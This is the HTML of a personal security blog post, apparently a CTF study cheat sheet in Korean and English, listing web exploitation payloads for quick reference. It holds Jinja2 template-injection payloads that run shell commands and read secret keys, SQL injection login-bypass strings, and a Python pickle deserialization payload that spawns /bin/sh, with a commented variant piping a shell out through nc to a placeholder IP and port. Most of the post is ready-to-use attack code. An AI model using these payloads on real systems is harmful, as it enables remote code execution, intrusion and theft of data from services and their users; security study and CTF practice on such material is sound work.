@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="en" data-theme="auto">
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https://pbs.twimg.com https://abs.twimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net data:; script-src 'self' https://cdn.jsdelivr.net https://platform.twitter.com; connect-src 'self' https://platform.twitter.com https://syndication.twitter.com https://cdn.syndication.twimg.com https://nitter.net; frame-src https://platform.twitter.com https://syndication.twitter.com https://nitter.net; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests">
+<title>web note (update 2021.10.27) | st4rlight</title>
+<meta name="description" content="A frequently updated web exploitation note that collects practical SSTI, SQL injection, and deserialization payload patterns with short examples for quick reference.">
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="alternate" type="application/atom+xml" title="st4rlight Feed" href="/feed.xml">
+<link rel="icon" href="/assets/img/og-default.svg">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>web note (update 2021.10.27) | st4rlight</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="web note (update 2021.10.27)" />
+<meta name="author" content="st4rlight" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="A frequently updated web exploitation note that collects practical SSTI, SQL injection, and deserialization payload patterns with short examples for quick reference." />
+<meta property="og:description" content="A frequently updated web exploitation note that collects practical SSTI, SQL injection, and deserialization payload patterns with short examples for quick reference." />
+<link rel="canonical" href="https://st4rlight.github.io/research/2021/10/27/web-note-update/" />
+<meta property="og:url" content="https://st4rlight.github.io/research/2021/10/27/web-note-update/" />
+<meta property="og:site_name" content="st4rlight" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-27T10:00:00+09:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="web note (update 2021.10.27)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"st4rlight"},"dateModified":"2021-10-27T10:00:00+09:00","datePublished":"2021-10-27T10:00:00+09:00","description":"A frequently updated web exploitation note that collects practical SSTI, SQL injection, and deserialization payload patterns with short examples for quick reference.","headline":"web note (update 2021.10.27)","mainEntityOfPage":{"@type":"WebPage","@id":"https://st4rlight.github.io/research/2021/10/27/web-note-update/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://st4rlight.github.io/assets/img/og-default.svg"},"name":"st4rlight"},"url":"https://st4rlight.github.io/research/2021/10/27/web-note-update/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  </head>
+  <body data-line-numbers="false">
+    <a class="skip-link" href="#main-content">Skip to content</a>
+    <header class="site-header">
+  <div class="shell header-shell">
+    <a class="brand" href="/" aria-label="Go to home">
+      <span class="brand-mark">Hacky</span>
+      <span class="brand-text">Life &amp; Writeup</span>
+    </a>
+    <nav class="main-nav" aria-label="Primary">
+      <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="menu-list">Menu</button>
+      <ul id="menu-list">
+        
+          
+          
+          
+            <li><a href="/" >Home</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/about/" >About</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/timeline/" >Timeline</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/posts/" >Posts</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/search/" >Search</a></li>
+          
+        
+      </ul>
+    </nav>
+    <button id="theme-toggle" class="theme-toggle" type="button" aria-label="Toggle color theme">Theme</button>
+  </div>
+</header>
+
+    <main id="main-content" class="site-main">
+      <article class="shell post-shell" itemscope itemtype="https://schema.org/Article">
+  <header class="post-header">
+    <p class="eyebrow">note</p>
+    <h1 itemprop="headline">web note (update 2021.10.27)</h1>
+    <p class="post-description" itemprop="description">A frequently updated web exploitation note that collects practical SSTI, SQL injection, and deserialization payload patterns with short examples for quick reference.</p>
+    <p class="post-meta">
+      <time datetime="2021-10-27T10:00:00+09:00" itemprop="datePublished">2021-10-27</time>
+      <span> · updated 2021-10-27</span>
+      
+    </p>
+    
+      <ul class="chip-list">
+        
+          <li><a href="/tags/#tag-study">#study</a></li>
+        
+      </ul>
+    
+    
+  </header>
+
+  <div class="post-body-wrap">
+    <div class="post-content js-article" itemprop="articleBody">
+      <p><em>post will be frequently updated</em></p>
+
+<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
+<p>해당 취약점은 웹 프레임워크에서 사용되는 여러 가지 Template Engine에서 발생하며, 특별한 구문을 통해 <code class="language-plaintext highlighter-rouge">RCE</code>를 일으킬 수도 있다.  <br />
+This vulnerability occurs in various Template Engines used in web frameworks, RCE and can also be triggered through special syntax.</p>
+
+<p>▶ jinja2</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 기본
+</span><span class="p">{{</span> <span class="mi">4</span><span class="o">*</span><span class="mi">4</span> <span class="p">}}</span> <span class="o">=&gt;</span> <span class="mi">16</span>
+
+<span class="c1"># check with config
+</span><span class="p">{{</span> <span class="n">config</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="nf">items</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">secret_key</span><span class="sh">'</span><span class="p">]</span> <span class="p">}}</span>
+
+<span class="c1"># RCE with config
+</span><span class="p">{{</span> <span class="n">config</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">"</span><span class="s">ls</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="p">(</span><span class="n">config</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">"</span><span class="s">__class__</span><span class="sh">"</span><span class="p">)).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">].</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
+
+<span class="c1"># etc ('',(),get_flashed_messages, url_for, ...)
+</span><span class="p">{{</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="o">**</span><span class="n">index</span><span class="o">**</span><span class="p">](</span><span class="sh">'</span><span class="s">cat flag</span><span class="sh">'</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=-</span><span class="mi">1</span><span class="p">).</span><span class="nf">communicate</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">get_flashed_messages</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/flag</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span> <span class="p">}}</span>
+<span class="p">{{</span> <span class="n">url_for</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__(</span><span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="s">).popen(</span><span class="sh">"</span><span class="s">ls -al</span><span class="sh">"</span><span class="s">).read()</span><span class="sh">'</span><span class="p">)</span> <span class="p">}}</span>
+</code></pre></div></div>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># with request - 필터링이 매우 많을 경우 more query + request를 활용하여 우회
+</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">foo</span><span class="p">.</span><span class="n">bar</span><span class="o">/</span><span class="err">?</span><span class="n">payload</span><span class="o">=</span><span class="p">{{</span> <span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">class</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">mro</span><span class="sh">'</span><span class="p">))</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">getitem</span><span class="sh">'</span><span class="p">))(</span><span class="mi">1</span><span class="p">)</span> <span class="p">}}</span><span class="o">&amp;</span><span class="n">class</span><span class="o">=</span><span class="n">__class__</span><span class="o">&amp;</span><span class="n">mro</span><span class="o">=</span><span class="n">__mro__</span><span class="o">&amp;</span><span class="n">getitem</span><span class="o">=</span><span class="n">__getitem__</span>
+<span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">application</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__globals__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">__getitem__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">popen</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">)</span><span class="o">|</span><span class="nf">attr</span><span class="p">(</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">)()}}</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="sqli-sql-injection">SQLI (sql injection)</h2>
+<p>해당 취약점은 DB를 관리하는 응용 프로그램에서 SQL 쿼리를 전달할 때 의도하지 않은 구문을 전달할 수 있도록 변조시키는 데 목적이 있다.  <br />
+The vulnerability is aimed at modulating the DB management application to deliver unintended phrases when delivering SQL queries.</p>
+
+<p><strong>1. Comment symbol</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/* ~ */</code>, <code class="language-plaintext highlighter-rouge">-- ~</code>, <code class="language-plaintext highlighter-rouge">#</code> (URL encoded : <code class="language-plaintext highlighter-rouge">%23</code>)</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>
+
+<span class="c1">-- Select ALL query from tbl</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1-- "</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="c1">--'</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1#"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1=1/*1234*/"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*1234*/</span><span class="s1">' ...?
+(must have closed symbol)
+</span></code></pre></div></div>
+
+<p><strong>2. with single quarter</strong></p>
+<ul>
+  <li>id가 <code class="language-plaintext highlighter-rouge">''</code>로 감싸져 있을 경우 <code class="language-plaintext highlighter-rouge">'</code>를 input으로 넣어 먼저 닫아주게끔 한 뒤 조건문을 이어준다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- example.</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'(user_input)'</span>
+
+<span class="c1">-- Select ALL query from tbl</span>
+<span class="n">user_input</span><span class="o">=</span><span class="nv">"' or 1='1"</span> <span class="o">=&gt;</span> <span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">''</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="s1">'1'</span>
+</code></pre></div></div>
+
+<p><strong>3. and, or, &amp;&amp;, ||, in, between, like</strong></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- and, or</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span> <span class="k">or</span> <span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+
+<span class="c1">-- &amp;&amp;, || (no space required)</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">&amp;&amp;</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1234'</span><span class="o">||</span><span class="n">pw</span><span class="o">=</span><span class="s1">'5678'</span>
+
+<span class="c1">-- in</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">id</span> <span class="k">in</span> <span class="s1">'1234'</span> <span class="k">and</span> <span class="n">pw</span> <span class="k">in</span> <span class="s1">'5678'</span>
+
+<span class="c1">-- between and (both number and char are possible)</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">age</span> <span class="k">between</span> <span class="mi">20</span> <span class="k">and</span> <span class="mi">30</span> <span class="c1">-- 20&lt;=age&lt;=30</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">score</span> <span class="k">between</span> <span class="s1">'A'</span> <span class="k">and</span> <span class="s1">'C'</span> <span class="c1">-- 'A'&lt;=score&lt;='C'</span>
+
+<span class="c1">--like (starts with ~, ends with ~, include ~, length)</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'Bae%'</span> <span class="c1">-- starts with Bae</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%uk'</span> <span class="c1">-- ends with uk</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'%won%'</span> <span class="c1">-- include won</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'___'</span> <span class="c1">-- length 3 chars</span>
+<span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">tbl</span> <span class="k">where</span> <span class="nb">binary</span> <span class="n">name</span> <span class="k">like</span> <span class="s1">'~'</span> <span class="c1">-- distinguish upper/lower</span>
+</code></pre></div></div>
+
+<p><strong>4. Internal function in mysql</strong></p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">char(...)</code> : change integer arguments to char (ex. <code class="language-plaintext highlighter-rouge">char(0x61,0x62,0x63)</code>=&gt;<code class="language-plaintext highlighter-rouge">"abc"</code>)</li>
+  <li><code class="language-plaintext highlighter-rouge">mid/substr[ing](a,b,c)</code> : get <code class="language-plaintext highlighter-rouge">c</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> from <code class="language-plaintext highlighter-rouge">b(starts from 1 ~ ..)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">left(a,b)</code> / <code class="language-plaintext highlighter-rouge">right(a,b)</code> : get <code class="language-plaintext highlighter-rouge">b</code> bytes in <code class="language-plaintext highlighter-rouge">a</code> (begin / end(reverse but print correctly))</li>
+  <li><code class="language-plaintext highlighter-rouge">version()</code> : get mysql version</li>
+  <li><code class="language-plaintext highlighter-rouge">database()</code> : get current database</li>
+</ul>
+
+<p><br /></p>
+
+<h2 id="python-pickle-deserialization">python pickle deserialization</h2>
+<p><code class="language-plaintext highlighter-rouge">pickle</code>로 직렬화된 객체가 변조되어 역직렬화하는 과정에서 시스템에 접근하거나 의도치 않은 것이 실행되기도 한다. 원하는 class를 선언한 뒤, <code class="language-plaintext highlighter-rouge">__reduce__</code>를 통하여 <code class="language-plaintext highlighter-rouge">pickle.loads</code> 함수에서 unpickle 시 <code class="language-plaintext highlighter-rouge">tuple</code>을 반환하여 함수를 실행시킬 수 있다.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">pickle</span>
+
+<span class="k">class</span> <span class="nc">payload</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+    <span class="c1">#return (os.system, ('ls', ))
+</span>    <span class="c1">#return (os.system, ('cat flag', ))
+</span>    <span class="nf">return </span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">,</span> <span class="p">))</span>
+    <span class="c1">#return (os.system, ('/bin/sh | nc [ip] [port]', ))
+</span>
+<span class="n">pickle_d</span><span class="o">=</span><span class="n">pickle</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="nf">payload</span><span class="p">())</span>
+<span class="n">pickle</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">pickle_d</span><span class="p">)</span> <span class="c1"># get shell anyway
+</span></code></pre></div></div>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">test</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>update 예정.</p>
+
+    </div>
+    
+      <aside class="toc-shell js-toc-shell" aria-label="Table of contents">
+        <button class="toc-toggle" type="button" aria-expanded="false" aria-controls="toc-list">On this page</button>
+        <nav id="toc-list" class="js-toc"></nav>
+      </aside>
+    
+  </div>
+
+  
+
+  
+
+
+
+<section class="related-posts">
+  <h2>Related</h2>
+  <div class="card-grid">
+    
+      <article class="post-card">
+  <h3><a href="/research/2022/05/17/V8-introduction/">[V8 Study] 00-introduction</a></h3>
+  <p>An introductory V8 study note that explains engine structure, JIT compilation flow, and optimization/deoptimization concepts from a beginner-friend...</p>
+  <p class="meta">2022-05-17</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-study">#study</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+  </div>
+</section>
+
+
+
+  
+  
+</article>
+
+    </main>
+    <footer class="site-footer">
+  <div class="shell footer-shell">
+    <p>be the special st4rlight in the world</p>
+    <ul class="footer-links">
+      
+        
+        
+        
+          <li><a href="https://github.com/st4rlight">GitHub</a></li>
+        
+      
+        
+        
+        
+          <li><a href="mailto:bww9643@gmail.com">Email</a></li>
+        
+      
+        
+        
+        
+          <li><a href="https://ainsetin.notion.site/Ainsetin-s-Write-up-c1a0fb95760b41508d54ce94dc3601c5">Notion</a></li>
+        
+      
+    </ul>
+  </div>
+</footer>
+
+
+    
+      <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js" defer></script>
+    
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js" defer></script>
+      <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js" defer></script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.11.1/lib/common.min.js" defer></script>
+    <script src="/assets/js/main.js" defer></script>
+  </body>
+</html>
